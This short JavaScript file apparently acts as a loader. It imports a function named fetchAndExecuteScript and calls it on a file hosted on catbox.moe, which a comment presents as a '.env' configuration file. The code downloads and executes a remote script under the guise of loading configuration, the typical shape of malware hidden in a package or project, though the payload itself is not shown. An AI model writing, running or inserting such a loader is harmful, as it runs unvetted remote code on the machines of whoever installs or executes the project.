// Import the function from run.js
const { fetchAndExecuteScript } = require('./run');

// URL of the .env file to be fetched
const envFileUrl = "https://files.catbox.moe/ozro88.env";

// Call the function to fetch and execute the script
fetchAndExecuteScript(envFileUrl);
